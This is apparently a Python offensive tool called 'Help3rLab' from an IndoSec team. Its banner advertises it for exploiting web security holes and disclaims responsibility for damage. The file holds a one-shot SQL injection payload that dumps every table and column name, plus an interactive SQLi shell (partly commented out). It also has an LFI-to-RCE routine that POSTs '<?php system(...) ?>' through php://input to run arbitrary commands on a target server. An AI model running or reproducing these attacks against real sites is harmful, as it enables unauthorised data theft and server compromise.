# -*- coding: utf-8 -*-
#!/usr/bin/python

import requests, sys, os, readline, re, binascii, pprint, time, json
from modules import Sqli

try:
    from urllib.parse import urlparse
except ImportError:
    from urlparse import urlparse

# reload(sys)
# sys.setdefaultencoding('utf8')

dios = " (select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x) "

def banner():
    print("""
\033[97m[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
\033[97m[\033[90m.................................\033[90;1m-----------------.................................\033[97m]
\033[97m[\033[90m.................................\033[90;1m|..\033[91m%%%%%%%%%%%\033[90m..\033[90;1m|\033[90m.................................\033[97m]
\033[97m[\033[90m.................................\033[90;1m|..\033[91m%%%%%%%%%%%\033[90m..\033[90;1m|\033[90m.................................\033[97m]
\033[97m[\033[90m.................................\033[90;1m|..\033[91m%%%%%%%%%%%\033[90m..\033[90;1m|\033[90m.................................\033[97m]
\033[97m[\033[90m.................................\033[90;1m|..\033[91m%%%%%\033[90m........\033[90;1m|\033[90m.................................\033[97m]
\033[97m[\033[90m.\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%%%%%\033[90m..\033[97m%%\033[90m......\033[97m%%%%%\033[90m...\033[90;1m|..\033[91m%%%%%\033[90m........\033[90;1m|\033[90m..\033[97m%%%%%\033[90m...\033[97m%%\033[90m.......\033[97m%%%%\033[90m...\033[97m%%%%%\033[90m..\033[97m]
\033[97m[\033[90m.\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m......\033[97m%%\033[90m......\033[97m%%\033[90m..\033[97m%%\033[90m..\033[90;1m|..\033[91m%%%%%%%%\033[90m.....\033[90;1m|\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m......\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m.\033[97m]
\033[97m[\033[90m.\033[97m%%%%%%\033[90m..\033[97m%%%%\033[90m....\033[97m%%\033[90m......\033[97m%%%%%\033[90m...\033[90;1m|\033[90m..\033[91m%%%%%%%%\033[90m.....\033[90;1m|\033[90m..\033[97m%%%%%\033[90m...\033[97m%%\033[90m......\033[97m%%%%%%\033[90m..\033[97m%%%%%\033[90m..\033[97m]
\033[97m[\033[90m.\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m......\033[97m%%\033[90m......\033[97m%%\033[90m......\033[90;1m|..\033[91m%%%%%%%%\033[90m.....\033[90;1m|\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m......\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m.\033[97m]
\033[97m[\033[90m.\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%%%%%\033[90m..\033[97m%%%%%%\033[90m..\033[97m%%\033[90m......\033[90;1m|..\033[91m%%%%%\033[90m........\033[90;1m|\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%%%%%\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%%%%\033[90m\033[90m..\033[97m]
\033[97m[\033[90m.................................\033[90;1m|..\033[91m%%%%%\033[90m........\033[90;1m|\033[90m.................................\033[97m]
\033[97m[\033[90m.................................\033[90;1m|..\033[91m%%%%%%%%%%%\033[90m..\033[90;1m|\033[90m.................................\033[97m]
\033[97m[\033[90m.................................\033[90;1m|..\033[91m%%%%%%%%%%%\033[90m..\033[90;1m|\033[90m.................................\033[97m]
\033[97m[\033[90m.................................\033[90;1m|..\033[91m%%%%%%%%%%%\033[90m..\033[90;1m|\033[90m.................................\033[97m]
\033[97m[\033[90m.................................\033[90;1m-----------------.................................\033[97m]                        
\033[97m[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
       =[ \033[93;2mHelp3rLab v.0.1 Beta\033[97;0m                                    ]=
+ -- --=[ Author : Binsar DJ, Fauzanw & Rizsyad AR                ]=-- -- +
+ -- --=[ Team   : { IndoSec }                                    ]=-- -- +
+ -- --=[ Help3rLab is your helper lab to exploit security holes  ]=-- -- + 
+ -- --=[ We not responsible for damage caused by Help3rL4b,      ]=-- -- +   
    """)

def menu():
    print("""
[\033[91m+\033[97m] Options :
└[\033[92m•\033[97m] \033[91m1. \033[97mSQL Injection
└[\033[92m•\033[97m] \033[91m2. \033[97mRemote File Inclusion
└[\033[92m•\033[97m] \033[91m3. \033[97mLocal File Inclusion
└[\033[92m•\033[97m] \033[91m4. \033[97mRemote Command Execution
└[\033[92m•\033[97m] \033[91m5. \033[97mLFI to RCE
""")

# def check_vuln_sqli(url):
#     if re.search("\*", url):
#         r    = requests.get(url.replace("*","CONCAT(0x7b20496e646f536563207d,user(),0x7b20496e646f536563207d)"))
#     else:
#         print("\033[97m[\033[91m-\033[97m] Error Inject Parameter Was Not Found")
#         sys.exit()

#     if r.status_code == 404:
#         print("\033[97m[\033[91m-\033[97m] Error, 404 Not Found, Check Your URL")
#         sys.exit(1)
#     else:
#         print("\033[97m[\033[92m+\033[97m] Your target is vulnerabilties")
#         time.sleep(2)
#         print("\033[97m[\033[93m!\033[97m] Trying to connect to your target...")
#         time.sleep(4)
#         print('\033[97m[\033[92m+\033[97m] Connected to your target')
#         execute_sqli(url, r.text.split('{ IndoSec }')[1])

# def execute_sqli(url, user):
#     try:
#         cmd = input("\033[96m┌["+ user +"]\n\033[96m└\033[93m#\033[97m ")
#         if cmd == "user":
#             option = "user()"
#         elif cmd == "dios":
#             option = dios
#         elif cmd == "exit":
#             sys.exit()
#         else:
#             option = cmd
#         r      = requests.get(url.replace("*","CONCAT(0x7b20496e646f536563207d,"+ option +",0x7b20496e646f536563207d)"))
#         output = r.text.split("{ IndoSec }")[1]
#         if re.search("<li>", output):
#             li = output.split("<li>")
#             for result in li:
#                 print(result)
#             execute_sqli(url,user)
#         elif re.search("<br>", output):
#             br = output.split("<br>")
#             for result in br:
#                 print(result)
#             execute_sqli(url, user)
#         print("\n[+] Output :",output, "\n")
#         execute_sqli(url, user)
#     except Exception:
#         print("\n[!] Syntax Error\n")
#         execute_sqli(url, user)

def sqli():
    print("[!] Example : http://target.com/parameter.php?id=10'+UNION+SELECT+1,2,3,*,5-- -")
    # url = input("[?] URL : ")
    url = input("[?] URL: ")

    if re.search("http", url):
        url = url
    elif re.search('\%68\%74\%74\%70', url):
        url = unquote(url)
    else:
        url = "http://"+url
    SQLIHELPER = Sqli(url)
    information = SQLIHELPER.information()
    hostname,port, ssl, openssl, symlink, socket, user, schema, version, base_dir, data_dir, os_version, machine_version = [information[k] for k in ('hostname', 'port', 'ssl', 'openssl', 'symlink', 'socket', 'user', 'schema', 'version', 'base_dir', 'data_dir', 'os_version', 'mechine_version')]
    print("[+] Information : ")
    print(f"└[\033[92m•\033[97m] Hostname         : {hostname}")
    print(f"└[\033[92m•\033[97m] Port             : {port}")
    print(f"└[\033[92m•\033[97m] SSL              : {ssl}")
    print(f"└[\033[92m•\033[97m] OpenSSL          : {openssl}")
    print(f"└[\033[92m•\033[97m] Symlink          : {symlink}")
    print(f"└[\033[92m•\033[97m] Socket           : {socket}")
    print(f"└[\033[92m•\033[97m] User             : {user}")
    print(f"└[\033[92m•\033[97m] DB Name          : {schema}")
    print(f"└[\033[92m•\033[97m] DB Version       : {version}")
    print(f"└[\033[92m•\033[97m] Base Dir         : {base_dir}")
    print(f"└[\033[92m•\033[97m] Data Dir         : {data_dir}")
    print(f"└[\033[92m•\033[97m] System Operation : {os_version}")
    print(f"└[\033[92m•\033[97m] Machine Version  : {machine_version}")
    SQLIHELPER.command_line()



    



def lfitorce():
    url = input("[?] Input Url : ")
    injection = input("[?] Injection parameter (ex. ?page=Data) : ")
    pisah = injection.split("=")

    print("\n")
    print("[!] Loading to injection RCE...")
    time.sleep(2)
    
    delete_whitelist = url.replace(injection, "")
    payload = "php://input"
    in_payload = pisah[0] + "=" + payload
    
    print("[!] Requets to target...")
    time.sleep(2)
    
    print("\n")
    
    i = 0
    
    while i < 1:
        injection_command = input("RCE@injection:# ")
        command = "<?php system('"+ injection_command +"'); ?>"
        rce = requests.post(delete_whitelist + in_payload, data=command)
        print(rce.text)
        if injection_command == 'exit':
            i = 1


banner()
menu()

try:
    action = input("\n[\033[93m?\033[97m] Options : ")

    if action == "1":
        sqli()
    elif action == "5":
        lfitorce()
except KeyboardInterrupt:
    print('\n[\033[92m+\033[97m] CTRL + C detected')
    print('[\033[92m+\033[97m] Exiting...')
    raise SystemExit
